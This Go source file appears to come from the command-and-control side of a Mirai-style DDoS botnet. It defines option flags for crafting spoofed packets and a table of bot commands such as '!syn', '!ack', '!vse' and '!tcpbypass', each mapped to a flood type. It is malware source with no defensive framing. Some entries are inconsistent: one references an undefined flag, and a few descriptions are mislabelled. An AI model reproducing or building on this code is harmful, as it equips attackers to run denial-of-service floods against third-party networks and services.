package attacks

var flagInfoLookup = map[string]FlagInfo{
	"size": {
		0,
		"Size of packet data, default is 512 bytes",
	},
	"len": {
		0,
		"Size of packet data, default is 512 bytes",
	},
	"rand": {
		1,
		"Randomize packet data content, default is 1 (yes)",
	},
	"tos": {
		2,
		"TOS field value in IP header, default is 0",
	},
	"ident": {
		3,
		"ID field value in IP header, default is random",
	},
	"ttl": {
		4,
		"TTL field in IP header, default is 255",
	},
	"df": {
		5,
		"Set the Dont-Fragment bit in IP header, default is 0 (no)",
	},
	"sport": {
		6,
		"Source port, default is random",
	},
	"dport": {
		7,
		"Destination port, default is random",
	},
	"domain": {
		8,
		"Domain name to attack",
	},
	"dhid": {
		9,
		"Domain name transaction ID, default is random",
	},
	"urg": {
		11,
		"Set the URG bit in IP header, default is 0 (no)",
	},
	"ack": {
		12,
		"Set the ACK bit in IP header, default is 0 (no) except for ACK flood",
	},
	"psh": {
		13,
		"Set the PSH bit in IP header, default is 0 (no)",
	},
	"rst": {
		14,
		"Set the RST bit in IP header, default is 0 (no)",
	},
	"syn": {
		15,
		"Set the ACK bit in IP header, default is 0 (no) except for SYN flood",
	},
	"fin": {
		16,
		"Set the FIN bit in IP header, default is 0 (no)",
	},
	"seqnum": {
		17,
		"Sequence number value in TCP header, default is random",
	},
	"acknum": {
		18,
		"Ack number value in TCP header, default is random",
	},
	"gcip": {
		19,
		"Set internal IP to destination ip, default is 0 (no)",
	},
	"source": {
		25,
		"Source IP address, 255.255.255.255 for random",
	},
	"randlen": {
		26,
		"Random length",
	},
}

var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
	"!udp": AttackInfo{
		0,
		[]uint8{2, 3, 4, 0, 1, 5, 6, 7, 25},
		"UDP flood",
	},
	"!syn": AttackInfo{
		1,
		[]uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
		"SYN flood",
	},
	"!ack": AttackInfo{
		2,
		[]uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
		"ACK flood",
	},
	"!udpplain": AttackInfo{
		3,
		[]uint8{0, 1, 7},
		"Plain UDP Attack, Harder Hitting.",
	},
	"!vse": AttackInfo{
		4,
		[]uint8{2, 3, 4, 5, 6, 7},
		"Valve source engine specific flood",
	},
	"!tcpbypass": {
		5,
		[]uint8{0, 7, 26},
		"TCP bypass socket flood",
	},
	"!tcplegit": {
		6,
		[]uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25, 27},
		"Silly legit tcp flood",
	},
	"!socket": {
		7,
		[]uint8{0, 6, 7},
		"Silliest socket flood",
	},
	"!udpcustom": {
		8,
		[]uint8{0, 7, 26},
		"TCP bypass socket flood",
	},
	"!udpbypass": AttackInfo{
		9,
		[]uint8{0, 1, 7},
		"UDP bypass flood",
	},
	"!tcp": AttackInfo{
		10,
		[]uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
		"TCP flood",
	},
}
